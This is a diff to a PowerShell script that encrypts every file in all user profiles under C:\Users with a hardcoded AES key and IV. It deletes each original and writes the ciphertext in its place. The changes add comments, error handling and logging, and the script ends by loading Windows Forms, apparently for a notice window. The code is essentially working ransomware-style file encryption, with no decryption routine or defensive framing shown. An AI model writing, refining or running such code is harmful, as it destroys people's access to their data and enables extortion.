@@ -1,4 +1,6 @@
-$base64Key = "AatN58YdomB+dm/PhpPH37/xwPLACPe5Uux1R3hoQDA="$base64IV = "fokodaUsWaO1iDBrE8MfvQ=="
+# Base64 Key and IV (replace with your values)
+$base64Key = "AatN58YdomB+dm/PhpPH37/xwPLACPe5Uux1R3hoQDA="
+$base64IV = "fokodaUsWaO1iDBrE8MfvQ=="
 $key = [System.Convert]::FromBase64String($base64Key)
 $iv = [System.Convert]::FromBase64String($base64IV)
 
@@ -10,46 +12,73 @@ function Encrypt-File {
         [byte[]]$iv
     )
 
-    $content = [System.IO.File]::ReadAllBytes($filePath)
+    try {
+        # Read file content
+        $content = [System.IO.File]::ReadAllBytes($filePath)
 
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Key = $key
-    $aes.IV = $iv
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        # Create AES instance
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.Key = $key
+        $aes.IV = $iv
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 
-    $encryptor = $aes.CreateEncryptor()
-    $encryptedBytes = $encryptor.TransformFinalBlock($content, 0, $content.Length)
+        # Encrypt the content
+        $encryptor = $aes.CreateEncryptor()
+        $encryptedBytes = $encryptor.TransformFinalBlock($content, 0, $content.Length)
 
-    Remove-Item $filePath -Force
+        # Delete the original file
+        Remove-Item $filePath -Force
 
-    [System.IO.File]::WriteAllBytes($filePath, $encryptedBytes)
+        # Write encrypted content to the same file
+        [System.IO.File]::WriteAllBytes($filePath, $encryptedBytes)
 
-    Write-Host "Encrypted: $filePath"
+        Write-Host "Encrypted: $filePath"
+    }
+    catch {
+        # Log any errors to the error log
+        $errorMessage = "Failed to encrypt: $filePath - Error: $_"
+        $errorMessage | Out-File -FilePath "C:\EncryptionErrors\error_log.txt" -Append
+    }
 }
 
+# Create the log folder if it doesn't exist
+$logFolderPath = "C:\EncryptionErrors"
+if (-not (Test-Path -Path $logFolderPath)) {
+    New-Item -Path $logFolderPath -ItemType Directory
+}
+
+# Get the base Users directory
 $usersDirectory = "C:\Users"
+
+# Exclude system directories like Public, Default, etc.
 $excludedDirectories = @('Public', 'Default', 'Default User', 'All Users')
 
+# Get all valid user directories (excluding system folders)
 $validUserDirectories = Get-ChildItem -Path $usersDirectory | Where-Object {
     $_.PSIsContainer -and
     $_.Name -notin $excludedDirectories
 }
 
+# Encrypt files in each user directory
 foreach ($userDir in $validUserDirectories) {
     Write-Host "Encrypting files in user directory: $($userDir.FullName)"
+
+    # Get all files in the user's home directory and subdirectories
     $files = Get-ChildItem -Path $userDir.FullName -Recurse -File
+
     foreach ($file in $files) {
         try {
             Encrypt-File -filePath $file.FullName -key $key -iv $iv
         } catch {
-            Write-Host "Failed to encrypt: $($file.FullName)"
+            # Log any errors in case something goes wrong
+            $errorMessage = "Failed to process: $($file.FullName) - Error: $_"
+            $errorMessage | Out-File -FilePath "C:\EncryptionErrors\error_log.txt" -Append
         }
     }
 }
 
 Write-Host "Encryption completed."
-
 
 # Load Windows Forms assembly
 Add-Type -AssemblyName System.Windows.Forms
